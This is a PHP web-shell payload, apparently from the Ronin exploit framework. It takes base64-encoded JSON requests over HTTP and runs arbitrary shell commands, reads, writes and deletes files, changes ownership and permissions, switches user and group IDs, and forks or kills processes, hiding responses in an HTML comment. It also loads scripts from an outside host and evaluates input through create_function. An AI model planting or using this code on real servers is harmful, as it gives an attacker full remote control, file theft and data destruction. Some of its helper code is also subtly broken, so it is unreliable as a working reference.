<?php

function rpc_format_command($args)
{
    $program   = array_shift($args);
    $arguments = array_map('escapeshellarg',$args);

    return $program . ' ' . join(' ',$arguments);
}

function rpc_parse_env($text)
{
  $lines = preg_split('/\r?\n/',$text);
  $env = Array();

  foreach ($lines as $line)
  {
    list($name,$value) = split('=',$line,2);
    $env[$name] = $value;
  }

  return $env;
}

define('RPC_FS_BLOCK_SIZE', 1024 * 512);

function rpc_fs_read($args)
{
  $file = fopen($args[0],"rb");
  fseek($file,intval($args[1]));

  $data = fread($file,RPC_FS_BLOCK_SIZE);

  fclose($file);
  return $data;
}

function rpc_fs_write($args)
{
  $file = fopen($args[0],"wb");
  fseek($file,intval($args[1]));

  $length = fwrite($file,$args[2]);

  fclose($file);
  return $length;
}

function rpc_fs_stat($args)
{
  $data = stat($args[0]);

  return Array(
    'inode'     => $data[1],
    'mode'      => $data[2],
    'nlinks'    => $data[3],
    'uid'       => $data[4],
    'gid'       => $data[5],
    'size'      => $data[7],
    'atime'     => $data[8],
    'mtime'     => $data[9],
    'ctime'     => $data[10],
    'blocksize' => $data[11],
    'blocks'    => $data[12]
  );
}
function rpc_fs_readlink($args) { return readlink($args[0]); }

function rpc_fs_getcwd($args)  { return getcwd(); }
function rpc_fs_chdir($args)   { chdir($args[0]); return getcwd(); }
function rpc_fs_readdir($args) {
  $dir = opendir($args[0]);
  $entries = Array();

  while (($entry = readdir($dir)) != false) {
    array_push($entries,$entry);
  }

  return $entries;
}
function rpc_fs_glob($args)    { return glob($args[0]); }
function rpc_fs_mktemp($args)  { return tempnam(sys_get_temp_dir(),$args[0]); }
function rpc_fs_mkdir($args)   { return mkdir($args[0]); }
function rpc_fs_copy($args)    { return copy($args[0],$args[1]); }
function rpc_fs_unlink($args)  { return unlink($args[0]); }
function rpc_fs_rmdir($args)   { return rmdir($args[0]); }
function rpc_fs_move($args)    { return rename($args[0],$args[1]); }
function rpc_fs_link($args)    { return link($args[0],$args[1]); }
function rpc_fs_chown($args)   { return chown($args[0],$args[1]); }
function rpc_fs_chgrp($args)   { return chgrp($args[0],$args[1]); }
function rpc_fs_chmod($args)   { return chmod($args[0],$args[1]); }

function rpc_process_getpid($args)  { return @posix_getpid(); }
function rpc_process_getppid($args) { return @posix_getppid(); }
function rpc_process_getuid($args)  { return @posix_getuid(); }
function rpc_process_setuid($args)  { return @posix_setuid(intval($args[0])); }
function rpc_process_geteuid($args) { return @posix_geteuid(); }
function rpc_process_seteuid($args) { return @posix_seteuid(intval($args[0])); }
function rpc_process_getgid($args)  { return @posix_getgid(); }
function rpc_process_setgid($args)  { return @posix_setgid(intval($args[0])); }
function rpc_process_getegid($args) { return @posix_getegid(); }
function rpc_process_setegid($args) { return @posix_setegid(intval($args[0])); }
function rpc_process_getsid($args)  { return @posix_getsid(); }
function rpc_process_setsid($args)  { return @posix_setsid(); }

function rpc_process_spawn($args)
{
  $pid = pcntl_fork();

  switch ($pid)
  {
  case -1:
    return false;
  case 0:
    exec(rpc_format_command($args));
  default:
    return true;
  }
}

function rpc_process_kill($args)
{
  if (isset($args[1])) { $signal = constant("SIG{$args[1]}"); }
  else                 { $signal = SIGKILL;                   }

  return posix_kill(intval($args[0]),$signal);
}

function rpc_process_getcwd($args)  { return rpc_fs_getcwd($args); }
function rpc_process_chdir($args)   { return rpc_fs_chdir($args); }
function rpc_process_time($args)    { return time(); }

define('RPC_SHELL_DELIMINATOR',str_repeat('#',80));

function rpc_shell_exec($args)
{
  $commands = Array(
    Array('env'),
    Array('echo', RPC_SHELL_DELIMINATOR),
    $args,
    Array('echo', RPC_SHELL_DELIMINATOR),
    Array('env')
  );
  $command = join('; ',array_map('rpc_format_command',$commands));

  $output  = shell_exec($command);

  list($orig_env,$output,$new_env) = explode(RPC_SHELL_DELIMINATOR,$output,3);

  $output   = chop($output);
  $orig_env = rpc_parse_env($orig_env);
  $new_env  = rpc_parse_env($new_env);

  return Array(
    'output' => $output,
    'env' => array_diff_assoc($orig_env,$new_env)
  );
}

if (!function_exists('json_encode'))
{
  // https://code.google.com/p/simplejson-php/
  function json_encode($value)
  {
    if ($value === null) { return 'null'; };  // gettype fails on null?

    $out = '';
    $esc = "\"\\/\n\r\t" . chr( 8 ) . chr( 12 );  // escaped chars
    $l   = '.';  // decimal point

    switch ( gettype( $value ) ) 
    {
    case 'boolean':
      $out .= $value ? 'true' : 'false';
      break;

    case 'float':
    case 'double':
      // PHP uses the decimal point of the current locale but JSON expects %x2E
      $l = localeconv();
      $l = $l['decimal_point'];
      // fallthrough...

    case 'integer':
      $out .= str_replace( $l, '.', $value );  // what, no getlocale?
      break;

    case 'array':
      // if array only has numeric keys, and is sequential... ?
      for ($i = 0; ($i < count( $value ) && isset( $value[$i]) ); $i++);
      if ($i === count($value)) {
        // it's a "true" array... or close enough
        $out .= '[' . implode(',', array_map('toJSON', $value)) . ']';
        break;
      }
      // fallthrough to object for associative arrays... 

    case 'object':
      $arr = is_object($value) ? get_object_vars($value) : $value;
      $b = array();
      foreach ($arr as $k => $v) {
        $b[] = '"' . addcslashes($k, $esc) . '":' . toJSON($v);
      }
      $out .= '{' . implode( ',', $b ) . '}';
      break;

    default:  // anything else is treated as a string
      return '"' . addcslashes($value, $esc) . '"';
      break;
    }
    return $out;
  }
}

if (!function_exists('json_decode'))
{
  // https://code.google.com/p/simplejson-php/
  function json_decode($json, $assoc = false) {
    /* by default we don't tolerate ' as string delimiters
       if you need this, then simply change the comments on
       the following lines: */

    // $matchString = '/(".*?(?<!\\\\)"|\'.*?(?<!\\\\)\')/';
    $matchString = '/".*?(?<!\\\\)"/';

    // safety / validity test
    $t = preg_replace( $matchString, '', $json );
    $t = preg_replace( '/[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/', '', $t );
    if ($t != '') { return null; }

    // build to/from hashes for all strings in the structure
    $s2m = array();
    $m2s = array();
    preg_match_all( $matchString, $json, $m );
    foreach ($m[0] as $s) {
      $hash       = '"' . md5( $s ) . '"';
      $s2m[$s]    = $hash;
      $m2s[$hash] = str_replace( '$', '\$', $s );  // prevent $ magic
    }

    // hide the strings
    $json = strtr( $json, $s2m );

    // convert JS notation to PHP notation
    $a = ($assoc) ? '' : '(object) ';
    $json = strtr( $json, 
      array(
        ':' => '=>', 
        '[' => 'array(', 
        '{' => "{$a}array(", 
        ']' => ')', 
        '}' => ')'
      ) 
    );

    // remove leading zeros to prevent incorrect type casting
    $json = preg_replace( '~([\s\(,>])(-?)0~', '$1$2', $json );

    // return the strings
    $json = strtr( $json, $m2s );

    /* "eval" string and return results. 
       As there is no try statement in PHP4, the trick here 
       is to suppress any parser errors while a function is 
       built and then run the function if it got made. */
    $f = @create_function( '', "return {$json};" );
    $r = ($f) ? $f() : null;

    // free mem (shouldn't really be needed, but it's polite)
    unset( $s2m ); unset( $m2s ); unset( $f );

    return $r;
  }
}

global $rpc_exception;

function rpc_error_handler($errno,$errstr)
{
  switch ($errno)
  {
  case E_WARNING:
  case E_USER_WARNING:
  case E_USER_ERROR:
    $rpc_exception = $errstr;
  }
}

function rpc_serialize($message) {
  return base64_encode(json_encode($message));
}
function rpc_deserialize($data) {
  return json_decode(base64_decode($data));
}

function rpc_lookup($names) { return "rpc_" . join($names,'_'); }
function rpc_call($request)
{
  if (isset($request->cwd)) { chdir($request->cwd); }

  if (is_array($request->env))
  {
    foreach ($request->env as $name => $value)
    {
      putenv("{$name}={$value}");
    }
  }

  $method    = rpc_lookup(split($request->name,'.'));
  $arguments = $request->arguments;

  set_error_handler('rpc_error_handler');
  $value = call_user_func($method,$arguments);

  if (isset($rpc_exception)) { return Array('exception' => $rpc_exception); }
  else                       { return Array('return'    => $value);         }
}

define('RPC_BASE_URL', 'http://ronin-ruby.github.com/data/ronin-exploits/payloads/php/rpc');

if (isset($_REQUEST['rpc_request']))
{
  $request  = rpc_deserialize(rawurldecode($_REQUEST['rpc_request']));
  $response = rpc_serialize(rpc_call($request));

  echo "<!-- <rpc-response>{$response}</rpc-response> -->";
}
else
{
  echo '<link rel="stylesheet" type="text/css" href="' . RPC_BASE_URL . '.css" />';
  echo '<script type="text/javascript" src="' . RPC_BASE_URL . '.js"></script>';
}

?>
